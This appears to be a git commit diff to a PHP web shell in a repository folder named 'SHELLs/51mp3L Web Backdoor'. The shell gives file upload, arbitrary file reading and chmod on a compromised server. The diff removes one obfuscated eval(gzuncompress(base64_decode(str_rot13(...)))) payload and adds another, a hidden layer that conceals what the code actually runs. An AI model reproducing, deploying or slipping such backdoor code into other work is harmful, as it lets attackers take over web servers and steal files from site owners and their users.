69917224050c3a746e0ea934b3662dec145d3284
Github User <84887432+1337r0j4n@users.noreply.github.com>
2024-06-29 23:57:26 +0630

    Add files via upload

--- SHELLs/51mp3L Web Backdoor/51mp3L.php
+++ SHELLs/51mp3L Web Backdoor/51mp3L.php
@@ -2,11 +2,6 @@
 set_time_limit(0);
 error_reporting(0);
 
-if(get_magic_quotes_gpc()){
-foreach($_POST as $key=>$value){
-$_POST[$key] = stripslashes($value);
-}
-}
 echo '<!DOCTYPE HTML>
 <HTML>
 <HEAD>
@@ -80,10 +75,10 @@ echo '<form enctype="multipart/form-data" method="POST">
 Upload File : <input type="file" name="file" />
 <input type="submit" value="upload" />
 </form>
-</td></tr>';
+</td></tr>'; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 if(isset($_GET['filesrc'])){
 echo '</table><br />';
-echo('<center><textarea cols=140 rows=37 name="src">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea><br />'); eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+echo('<center><textarea cols=140 rows=37 name="src">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea><br />');
 }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
 echo '</table><center><br />';
 if($_POST['opt'] == 'chmod'){
